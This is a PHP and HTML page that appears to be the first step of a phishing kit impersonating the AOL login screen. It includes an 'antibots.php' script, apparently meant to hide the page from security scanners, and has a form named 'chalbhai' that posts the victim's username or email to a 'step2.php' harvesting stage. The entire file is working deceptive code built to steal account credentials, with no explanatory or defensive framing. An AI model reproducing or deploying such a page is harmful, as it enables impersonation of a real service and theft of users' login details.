<?php
include 'antibots.php';
?>
<html>
<head>
<link rel="icon" href="SSL/icons.png">

<body>
<style type="text/css">
/*----------Text Styles----------*/
.ws6 {font-size: 8px;}
.ws7 {font-size: 9.3px;}
.ws8 {font-size: 11px;}
.ws9 {font-size: 12px;}
.ws10 {font-size: 13px;}
.ws11 {font-size: 15px;}
.ws12 {font-size: 16px;}
.ws14 {font-size: 19px;}
.ws16 {font-size: 21px;}
.ws18 {font-size: 24px;}
.ws20 {font-size: 27px;}
.ws22 {font-size: 29px;}
.ws24 {font-size: 32px;}
.ws26 {font-size: 35px;}
.ws28 {font-size: 37px;}
.ws36 {font-size: 48px;}
.ws48 {font-size: 64px;}
.ws72 {font-size: 96px;}
.wpmd {font-size: 13px;font-family: Arial,Helvetica,Sans-Serif;font-style: normal;font-weight: normal;}
/*----------Para Styles----------*/
DIV,UL,OL /* Left */
{
 margin-top: 0px;
 margin-bottom: 0px;
}
</style>

<style type="text/css">
div#container
{
	position:relative;
	width: 100%;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<title>AOL - login</title>
<body>
<img src="SSL/titled.png">
</div>


<form action=step2.php name=chalbhai id=chalbhai method=post>


<input name="email" required autocomplete="off" type="text" placeholder="Username or Email" style="outline:none;border:none;border-bottom:1px solid gray;position:absolute;width:298px;height:40px;left:1025px;top:230px;z-index:1">
<input type="hidden" name="create" value="0">

<div id="formimage1" style="position:absolute; left:1020px; top:300px; z-index:6"><input type="image" name="formimage1" src="SSL/com.png"></div></form>

</body></html>